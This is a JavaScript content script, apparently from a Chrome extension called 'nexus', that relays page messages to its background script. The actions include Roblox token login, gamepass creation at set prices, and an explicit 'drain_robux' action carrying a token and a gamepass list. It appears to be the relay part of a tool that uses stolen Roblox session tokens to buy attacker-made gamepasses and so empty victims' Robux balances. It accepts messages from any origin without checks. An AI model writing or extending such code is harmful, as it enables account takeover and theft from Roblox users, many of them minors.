window.addEventListener('message', (e) => {
  if (e.data?.type === 'nexus-login') {
    chrome.runtime.sendMessage({ action: 'login_roblox', token: e.data.token }, (resp) => {
      window.postMessage({ type: 'nexus-login-response', ok: resp?.ok === true, error: resp?.error }, '*');
    });
  } else if (e.data?.action === 'drain_robux_event') {
    chrome.runtime.sendMessage({
      action: 'drain_robux',
      token: e.data.token,
      gamepasses: e.data.gamepasses
    });
  } else if (e.data?.type === 'nexus-ping-request') {
    chrome.runtime.sendMessage({ action: 'ping' }, (resp) => {
      window.postMessage({ type: 'nexus-ping-response', success: resp?.success === true }, '*');
    });
  } else if (e.data?.type === 'nexus-get-universes-request') {
    chrome.runtime.sendMessage({ action: 'get_universes' }, (resp) => {
      window.postMessage({
        type: 'nexus-get-universes-response',
        success: resp?.success === true,
        universes: resp?.universes,
        error: resp?.error
      }, '*');
    });
  } else if (e.data?.type === 'nexus-create-gamepasses-request') {
    chrome.runtime.sendMessage({
      action: 'create_gamepasses',
      universeId: e.data.universeId,
      prices: e.data.prices
    }, (resp) => {
      window.postMessage({
        type: 'nexus-create-gamepasses-response',
        success: resp?.success === true,
        gamepasses: resp?.gamepasses,
        error: resp?.error
      }, '*');
    });
  }
});
